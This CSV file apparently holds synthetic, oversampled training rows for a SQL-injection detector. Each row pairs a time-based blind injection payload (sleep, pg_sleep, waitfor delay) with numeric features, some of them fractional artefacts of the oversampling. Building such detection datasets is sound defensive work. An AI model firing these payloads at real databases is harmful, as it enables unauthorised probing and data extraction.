id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,nearest_attack_euclidean,R000197,0.45559527743169603,75.51593777297406,19.109562663784434,2.9995208002633316,27.812750218379243,1.0,36.70318755459481,10.0,0.36789674808783446,0.013254700978900802,0.48630154114425694,0.13254700978900782,0.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000002,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000089,1.2883807130134644,67.73357112368724,27.244523707895745,3.936657378370352,26.111309269739362,10.0,21.622261853947872,10.0,0.382658646673214,0.14857407252531407,0.3201932082761579,0.14857407252531407,3.0,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0000000000000002,1.0,0.0,1.0,0.3111309269739361,0.6888690730260638,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000003,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R000155,0.5469767702776619,70.0,22.0,3.5211423531189547,27.0,4.0,27.0,12.0,0.38571428571428573,0.057142857142857134,0.38571428571428573,0.17142857142857143,5.510968943517965,0.4890310564820347,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,4.0,0.0,0.0,0.0,0.0,1.0,0.1222577641205087,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000004,attack,time,"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000234,0.49238620884554374,72.57197859569695,20.94318715741817,3.308140823952384,15.0,18.0,31.25758287655756,8.314395719139391,0.20689776150195435,0.24827731380234525,0.4303426661165082,0.1144822585791922,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.31439571913939,0.0,0.0,1.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000005,attack,time,1' where 7828  =  7828 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000129,0.1377665287215984,84.93941386347899,26.878827726957994,3.688856038975518,24.0,18.0,33.0,9.939413863478997,0.2825565920555328,0.21191744404164958,0.3885153140763576,0.11701064982646003,0.9394138634789961,0.0,2.0,0.0,0.0,2.0,0.0,4.0,0.0,1.0,0.0,4.0,0.9394138634789961,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000006,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,nearest_attack_euclidean,R000197,0.40787321861412124,75.38365401871461,19.67673080374292,3.014396701058933,27.706923214971688,1.0,36.67673080374292,10.0,0.36711888907108514,0.013278561684936047,0.48681693239461843,0.13278561684936038,0.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000007,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000099,0.5449608308842481,83.159375006108,21.210156248473,2.976194475166561,28.0,2.0,42.15937500610799,11.0,0.33683593747455004,0.02405970981961071,0.5067759486979803,0.13232840400785895,0.0,0.21015624847300274,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.789843751526998,0.0,0.0,0.0,1.0,0.0,0.21015624847300274,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000008,attack,time,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000199,0.9783697244086067,65.17731906496411,23.0,3.3831943387265393,19.725773021654703,10.0,28.451546043309406,7.0,0.30263459310484087,0.15349370114246247,0.43642611495297295,0.10744559079972371,0.0,0.27422697834529647,0.0,0.0,0.0,1.0,0.0,4.725773021654703,0.0,1.0,0.0,1.0,0.0,0.2742269783452965,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,0.7257730216547035,0.2742269783452965,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000009,attack,time,"1%""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000200,0.15528782241220496,72.39561316815549,27.0,3.5595049169848187,20.0,10.0,31.49634430679624,10.899268861359248,0.27811973108575294,0.13905986554287647,0.4323773876847062,0.1504430156866644,0.0,1.0,2.0,0.0,0.0,1.0,0.0,4.899268861359248,1.0,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000010,attack,time,1'||  (  select 'bwqc' from dual where 6897  =  6897 and sleep  (  5  )  #,nearest_attack_euclidean,R000138,1.392644232007927,77.4584747124672,30.371186415915055,4.0523218905085825,31.628813584084945,10.0,24.88644075225483,10.943220376127416,0.40927177887691624,0.12963676516300923,0.32035798048968395,0.1407334754703906,3.3144067920424716,0.0,0.0,0.0,0.0,1.0,0.0,3.314406792042472,0.0,0.0,0.0,3.6288135840849436,1.0,0.0,0.0,0.6855932079575282,0.0,1.0,1.0,0.0,0.0,0.0,1.0000000000000002,1.0,0.0,1.0,1.0,0.6855932079575282,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.6855932079575275
